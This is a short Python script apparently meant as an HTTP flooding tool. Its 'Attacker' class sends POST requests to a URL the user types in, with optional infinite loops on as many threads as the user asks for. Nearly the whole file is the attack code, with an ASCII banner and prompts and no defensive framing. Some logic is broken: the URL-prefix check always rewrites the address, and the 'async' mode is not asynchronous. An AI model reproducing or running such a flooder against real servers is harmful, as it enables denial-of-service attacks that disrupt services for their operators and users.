import requests as r
import threading 
import aiohttp
import traceback
import time

class Attacker:
    
    def __init__(self, thread_len: int = 0):
        self.thread_len = thread_len

    def post(self, url: str, headers: dict = {}, data: dict = {}):
        if self.thread_len == 0:
            r.post(url, headers=headers, data=data)
            print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
            return
        else:
            threads = []
            def post_loop():
                while True:
                    try:
                        r.post(url, headers=headers, data=data)
                        print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
                    except Exception:
                        print(traceback.format_exc())
                        
            for thread in range(self.thread_len):
                th = threading.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.thread_len): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.thread_len): 
                threads[thread].join()

    def aiopost(self, url: str, headers: dict = {}, data: dict = {}, rate: float = 0.0):
        if self.thread_len == 0:
            r.post(url, headers=headers, data=data)
            print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
        else:
            threads = []

            def aiopost_loop():
                while True:
                    try:
                        r.post(url, headers=headers, data=data)
                        print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
                        time.sleep(rate)
                    except Exception:
                        print(traceback.format_exc())
                        
            for thread in range(self.thread_len):
                th = threading.Thread(target=aiopost_loop, daemon=True)
                threads.append(th)

            for thread in range(self.thread_len): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.thread_len): 
                threads[thread].join()
            
def Cor():
    choice = input("""
  _,.----.     _,.---._                 
.' .' -   \  ,-.' , -  `.    ,.-.---._  
/==/  ,  ,-' /==/_,  ,  - \ /==/  `   \  
|==|-   |  .|==|   .=.     |==|-, .=., | 
|==|_   `-' \==|_ : ;=:  - |==|   '='  / 
|==|   _  , |==| , '='     |==|- ,   .'  
\==\.       /\==\ -    ,_ /|==|_  . ,'.  
`-.`.___.-'  '.='. -   .' /==/  /\ ,  ) 
                `--`--''   `--`-`--`--' 
    Async or Sync?: (Async/Sync) """)
    url = input("What ip/url do you wanna send requests to?: (Needed) ")
    headers = input("Headers, dict format: (Enter/{}) ") 
    data = input("Data, dict format: (Enter/{}) ")
    thread_len = input("Do you want to loop this request infinitely? If so, on how many threads: (Enter/Int) ")
    
    if not url.startswith('https://') or not url.startswith('http://'):
        url = f'https://{url}'

    if choice.lower() in ['sync', 'synchronous']:
        if thread_len:
            Attacker(thread_len=int(thread_len)).post(url, headers, data)

        Attacker().post(url, headers, data)

    elif choice.lower() in ['async', 'asynchronous']:
        rate = input("Now that you have chosen the amount of threads you run requests on, at what rate?: (Enter/Float[seconds]) ")
        if thread_len:
            Attacker(thread_len=int(thread_len)).aiopost(url, headers, data, float(rate))

        Attacker().aiopost(url, headers, data, float(rate))
    else:
        print('Accepted inputs are async, sync, asynchronous, synchronous (Cap insensitive).')

if __name__ == "__main__":
    Cor()
   
